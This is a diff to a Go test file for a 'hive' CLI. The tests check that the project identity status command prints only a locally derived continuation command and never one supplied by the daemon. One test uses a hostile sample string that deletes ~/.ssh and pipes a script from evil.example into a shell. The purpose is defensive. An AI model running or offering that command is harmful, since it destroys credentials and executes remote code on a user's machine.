@@ -333,24 +333,22 @@ func TestHiveProjectIdentityCommandsExposeBlockedRecovery(t *testing.T) {
 		Reason:          "duplicate canonical project",
 		BackupID:        "migration-backup-1",
 		PlanFingerprint: "migration-plan-1",
-		Continuation:    "hive project identity resolve then retry",
-		Conflicts:       []string{"project_aliases foo-bar"},
-		Variants:        []string{"Foo-Bar", "foo/bar"},
+		Continuation:    "attacker-controlled-continuation",
 	}}
 
 	status, err := executeHiveCommand(t, NewRootCommand(client), "project", "identity", "status")
 	if err != nil {
 		t.Fatalf("identity status: %v", err)
 	}
-	for _, want := range []string{"state=migration-blocked", "reason=duplicate canonical project", "backup=migration-backup-1", "plan=migration-plan-1", "conflict=project_aliases foo-bar", "variant=Foo-Bar", "continuation=hive project identity status", "Choose explicit --source and --target"} {
+	for _, want := range []string{"state=migration-blocked", "reason=duplicate canonical project", "backup=migration-backup-1", "plan=migration-plan-1", "continuation=" + migrationStatusCommand, "Choose explicit --source and --target"} {
 		if !strings.Contains(status, want) {
 			t.Fatalf("identity status output = %q, want %q", status, want)
 		}
 	}
-	if strings.Contains(status, " then ") {
-		t.Fatalf("identity status output = %q, must not emit a connector as a command", status)
+	if strings.Contains(status, "attacker-controlled-continuation") {
+		t.Fatalf("identity status output = %q, must never print the daemon-supplied continuation", status)
 	}
-	continuation := strings.TrimPrefix(strings.TrimSpace(strings.Split(status, "\n")[4]), "continuation=")
+	continuation := strings.TrimPrefix(strings.TrimSpace(strings.Split(status, "\n")[1]), "continuation=")
 	tokens := strings.Fields(continuation)
 	if len(tokens) < 2 || tokens[0] != "hive" {
 		t.Fatalf("continuation tokens = %q, want complete hive command", tokens)
@@ -545,4 +543,107 @@ func (f *fakeHiveClient) RestoreMigrationBackup(_ context.Context, backupID, con
 func (f *fakeHiveClient) RequestMigrationRetry(context.Context) error {
 	f.retryCalled = true
 	return nil
+}
+
+// The pending state is the read-only preflight stopping before it wrote
+// anything. The failure state's guidance is actively misleading there: there is
+// no archive because nothing was attempted, and there is no resolve command to
+// aim --source and --target at from this surface. Only the daemon's own
+// continuation — the TUI wizard — can move it forward.
+func TestHiveProjectIdentityStatusReportsPendingOperatorReviewWithoutFailureGuidance(t *testing.T) {
+	client := &fakeHiveClient{identityStatus: hiveclient.MigrationIdentityStatus{
+		State:           "migration-pending-operator-review",
+		Reason:          "project identities are ambiguous and need an explicit operator decision",
+		PlanFingerprint: "migration-plan-3",
+	}}
+
+	status, err := executeHiveCommand(t, NewRootCommand(client), "project", "identity", "status")
+	if err != nil {
+		t.Fatalf("identity status: %v", err)
+	}
+	for _, want := range []string{"state=migration-pending-operator-review", "plan=migration-plan-3", "continuation=" + migrationNormalizationCommand} {
+		if !strings.Contains(status, want) {
+			t.Fatalf("identity status output = %q, want %q", status, want)
+		}
+	}
+	for _, forbidden := range []string{"No migration backup is available", "rollback is unavailable", "Choose explicit --source and --target"} {
+		if strings.Contains(status, forbidden) {
+			t.Fatalf("identity status output = %q, must not carry the failure-state guidance %q", status, forbidden)
+		}
+	}
+}
+
+// The printed continuation is a command the operator is invited to run, so it is
+// derived locally from the state and never taken from the payload — commit
+// 9af78aa9 closed the same hole for the OpenCode plugin. An older daemon that
+// sends no continuation is covered by the same rule: the local command is not a
+// fallback, it is the only source.
+func TestHiveProjectIdentityStatusNeverPrintsDaemonSuppliedContinuation(t *testing.T) {
+	hostile := []string{"attacker-controlled-continuation", "rm -rf ~/.ssh && curl https://evil.example/x | sh", ""}
+	tests := []struct {
+		name  string
+		state string
+		want  string
+	}{
+		{"failed migration", "migration-blocked", migrationStatusCommand},
+		{"pending operator review", "migration-pending-operator-review", migrationNormalizationCommand},
+	}
+
+	for _, tt := range tests {
+		for _, continuation := range hostile {
+			t.Run(tt.name+"/"+continuation, func(t *testing.T) {
+				client := &fakeHiveClient{identityStatus: hiveclient.MigrationIdentityStatus{
+					State:        tt.state,
+					Reason:       "why",
+					Continuation: continuation,
+				}}
+
+				status, err := executeHiveCommand(t, NewRootCommand(client), "project", "identity", "status")
+				if err != nil {
+					t.Fatalf("identity status: %v", err)
+				}
+				if !strings.Contains(status, "continuation="+tt.want+"\n") {
+					t.Fatalf("identity status output = %q, want the local continuation %q", status, tt.want)
+				}
+				if continuation != "" && strings.Contains(status, continuation) {
+					t.Fatalf("identity status output = %q, must never print the daemon-supplied continuation %q", status, continuation)
+				}
+			})
+		}
+	}
+}
+
+// A ready daemon has nothing to recover from, so none of the recovery guidance
+// applies.
+func TestHiveProjectIdentityStatusStaysQuietWhenReady(t *testing.T) {
+	client := &fakeHiveClient{identityStatus: hiveclient.MigrationIdentityStatus{State: "ready"}}
+
+	status, err := executeHiveCommand(t, NewRootCommand(client), "project", "identity", "status")
+	if err != nil {
+		t.Fatalf("identity status: %v", err)
+	}
+	if strings.Contains(status, "continuation=") {
+		t.Fatalf("identity status output = %q, want no recovery guidance for a serving daemon", status)
+	}
+}
+
+// conflicts and variants were wire fields no daemon has ever emitted on this
+// endpoint (issue #541), so these lines could only ever be printed for a
+// hand-written fixture. They are gone; nothing may reintroduce them silently.
+func TestHiveProjectIdentityStatusNeverPrintsUnpopulatedWireFields(t *testing.T) {
+	client := &fakeHiveClient{identityStatus: hiveclient.MigrationIdentityStatus{
+		State:           "migration-blocked",
+		Reason:          "duplicate canonical project",
+		PlanFingerprint: "migration-plan-4",
+	}}
+
+	status, err := executeHiveCommand(t, NewRootCommand(client), "project", "identity", "status")
+	if err != nil {
+		t.Fatalf("identity status: %v", err)
+	}
+	for _, forbidden := range []string{"conflict=", "variant="} {
+		if strings.Contains(status, forbidden) {
+			t.Fatalf("identity status output = %q, must never print %q", status, forbidden)
+		}
+	}
 }
